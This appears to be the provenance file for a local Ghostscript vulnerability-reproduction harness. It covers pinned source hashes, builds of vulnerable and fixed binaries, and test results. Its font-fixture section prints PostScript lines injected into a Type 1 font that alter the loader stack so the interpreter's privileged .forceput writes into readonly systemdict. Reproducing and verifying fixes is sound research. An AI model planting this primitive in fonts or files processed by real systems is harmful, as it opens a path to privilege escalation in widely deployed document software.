# PROVENANCE — ghostscript2shell frontier harness

CVE-2026-125396 / "Upload2Shell". Claim sources and source-bound mechanism:
`reports/frontier-ghostscript.md`. All work local; no network probe, no service,
no off-loopback contact. Fetching source/advisories is provisioning.

## Pinned blobs (`src/SHA256SUMS`)

| File | Origin | SHA-256 |
|---|---|---|
| `gs_fonts.ps.ghostpdl-10.07.0` | `https://raw.githubusercontent.com/ArtifexSoftware/ghostpdl/ghostpdl-10.07.0/Resource/Init/gs_fonts.ps` | `844ca0cb12eccd32876d938eef42288cd17e9ab79b91f7dec6bb7ded1a9c3233` |
| `gs_fonts.ps.ghostpdl-10.07.1` | tag `ghostpdl-10.07.1` (byte-identical) | `844ca0cb12eccd32876d938eef42288cd17e9ab79b91f7dec6bb7ded1a9c3233` |
| `gs_fonts.ps.1484854e` | fix commit `1484854e0c8ddfda1baa4ad4cd965b8a9790aa81` | `1ad111af10bcce10f1c2fe0162c934121d4cfb7265dc44aa8df6a07815f02d34` |
| `fix-1484854e.patch` | `https://github.com/ArtifexSoftware/ghostpdl/commit/1484854e... .patch` | `8a279018297ebd71cea1e008f9de0ff411a70b718c5657de29eae1cdc6637073` |
| `ghostpdl-10.07.0.tar.gz` | `https://codeload.github.com/ArtifexSoftware/ghostpdl/tar.gz/refs/tags/ghostpdl-10.07.0` | `6e7c0c61c8dfcd6b0a0b6aeebebe7d62868d42e42b9b8b77daf44a2ae0e6529a` |

The tarball's bundled `Resource/Init/gs_fonts.ps` hashes to the vulnerable pin,
so the tested interpreter resource is shipped tag bytes, not a reconstruction.
The fix patch touches only `Resource/Init/gs_fonts.ps`.

## Build

```
cd src
curl -fL -o ghostpdl-10.07.0.tar.gz \
  https://codeload.github.com/ArtifexSoftware/ghostpdl/tar.gz/refs/tags/ghostpdl-10.07.0
tar xzf ghostpdl-10.07.0.tar.gz            # -> ghostpdl-ghostpdl-10.07.0
cd ghostpdl-ghostpdl-10.07.0
./autogen.sh                                # configure generated; its X11 probe fails, harmless
./configure --without-x --disable-cups
make -j2 gs                                 # bin/gs, version 10.07.0
# vulnerable binary:
cp bin/gs ../../harness/bin/gs-vuln
# fixed binary: swap ONLY the resource, rebuild, copy, restore
cp gs_fonts.ps.1484854e Resource/Init/gs_fonts.ps
make -j2 gs
cp bin/gs ../../harness/bin/gs-fixed
cp gs_fonts.ps.ghostpdl-10.07.0 Resource/Init/gs_fonts.ps
make -j2 gs                                 # tree back to vulnerable pin
```

`gs-vuln` sha256 `59e8c548cf6d32d2f407b5d2ecb6fb3bb2e3744622d368c6fb67f0d852031ed1`.
`gs-fixed` sha256 `0f3c962cd3ef12fd975786b4ced3ebe89291ce831163b816e495419fa4d6167f`.
Resource baked into ROMFS: `-I` cannot override it; a rebuild is the only
reliable fixed control. Both binaries report `10.07.0`.

## Font fixtures

`harness/font-injected.pfa` derives from
`/usr/share/fonts/X11/Type1/NimbusSans-Regular.pfb` converted with the shipped
`ghostpdl-10.07.0/lib/pfbtopfa`:

```
./bin/gs -P- -q -dNODISPLAY -dNOSAFER -- ./lib/pfbtopfa.ps \
  /usr/share/fonts/X11/Type1/NimbusSans-Regular.pfb nimbus.pfa
```

Four lines were injected after the leading comments, before `10 dict begin`:

```
(DEPTH2_BEFORE=) print 2 index type == flush
3 -1 roll pop
[ 31337 4242 5151 ]
3 1 roll
(DEPTH2_AFTER=) print 2 index type == flush
(GS_SURGERY_DONE count=) print count == flush
```

The `DEPTH2_*` and `GS_SURGERY_DONE` prints are measurement scaffolding, not
part of the exploit primitive; they are left in the vendored fixture so the
harness can assert the loader stack was actually altered. `font-safe.pfa` is
the same PFA with no injected lines.

- `font-injected.pfa` sha256 `ef164da0c9db3fa84ea2f5494dfc856c22fd65752336a48dbf24224ec386b1fa`
- `font-safe.pfa` sha256 `85649a2b1b2f86df9addfe0ccc27ae48ec2ea6ee1815e180a33d73d062b2a4c6`
- `rung1.ps` sha256 `8d83df9aad539d30a6942f4d618bef0411c17759b0d0fa05d396d7b952dbd062`

## Model boundaries

Real interpreter, real Type 1 font loader, real bound helper, real `.forceput`.
Not a C slice over stubs. `systemdict` is a genuinely readonly global dict;
the observed write is a privileged store performed by the interpreter's own
`.forceput`, with the writeup's five-pop `/typecheck` handler. The marker value
is a benign integer; no local object was stored into a surviving global dict,
so no UAF was demonstrated. The fixed control changes only the shipped
`gs_fonts.ps` operand-type guard. No ASan build, no native memory inspection,
no pointer chain, no `-dSAFER` bypass, no `%pipe%` command, no network or
application chain.

## Verification

`cd harness && ./run.sh` → 22 PASS / 0 FAIL, three identical runs and a clean
minimal `/tmp` replay; normalized trace
`a4569485cb1fb98ab74b7d186e1566f18ede6bdb263cdb4e5e34f631e5683c29`.
Raw outputs in `harness/evidence/`.

## Preserved negatives

- Host gs 10.02.1 is patched and hides `.forceput`, `.forcebind`,
  `.currentglobal`, `.undefinternalnames`; direct-call harness impossible.
- `-I` resource override loses to ROMFS; fixed control needs a rebuild.
- Wrong first stack-surgery rolls (`2 1 roll`) left the filename a string.
- Naive save/restore UAF probe: `STALE_KEY=true`, `UAF_READ=null` — no
  allocation aliasing; 2048-byte-string marker scan not attempted.
- No ASan, no pointer control, no command, no rung 5.
